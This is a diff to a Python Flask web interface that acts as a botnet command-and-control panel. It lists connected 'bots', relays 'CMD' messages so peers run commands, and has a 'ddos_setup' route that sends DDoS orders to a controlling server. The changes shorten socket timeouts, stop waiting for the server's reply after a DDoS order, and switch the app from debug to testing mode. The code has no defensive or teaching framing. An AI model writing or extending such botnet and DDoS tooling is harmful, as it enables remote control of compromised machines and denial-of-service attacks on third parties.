@@ -8,6 +8,7 @@ import sys
 import connection
 
 app = Flask(__name__)
+app.config['TESTING'] = True
 connection_err = 'Failed to connect to the server'
 insert_err = 'Check if ip and port are correct'
 
@@ -62,7 +63,7 @@ def main_activity():
             sock.connect((session.get('ip'), session.get('port')))
             try:
                 sock.send("*".encode('utf-8'))
-                ip_data = connection.recvTimeout(sock, timeout=1).split('*')
+                ip_data = connection.recvTimeout(sock, 0.5).split('*')
                 session['cnt_peers'] = len(ip_data)
                 print('[DEBUG] Bots connected %s' %str(ip_data), file=sys.stdout)
                 sock.close()
@@ -87,7 +88,7 @@ def peer_activity(ip):
             srv_msg = "*".join(['CMD', host, cmd])
             sock.send(srv_msg.encode('utf-8'))
             print("[DEBUG] Message to server [%s] | PEER [%s]" %(srv_msg, host))
-            resp = connection.recvTimeout(sock, 8)
+            resp = connection.recvTimeout(sock, 0.5)
             sock.close()
             #TODO Check  resp format
             if resp:
@@ -119,12 +120,8 @@ def ddos_setup():
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((session.get('ip'), session.get('port')))
             sock.send(msg.encode('utf-8'))
-            srv_rsp = connection.recvTimeout(sock, 2)
             sock.close()
-            if srv_rsp:
-                return render_template('ddos_setup.html', n_peers = session.get('cnt_peers'), response = srv_rsp)
-            else:
-                return render_template('ddos_setup.html', n_peers = session.get('cnt_peers'))
+            return render_template('ddos_setup.html', n_peers = session.get('cnt_peers'))
         elif request.form['submit'] == 'Back':
             return redirect(url_for('main_activity'))
 
@@ -136,5 +133,6 @@ def ddos_setup():
 
 if __name__ == "__main__":
     app.secret_key = os.urandom(12)
-    app.debug=True
+    app.debug=False
+    app.testing=True
     app.run('0.0.0.0')
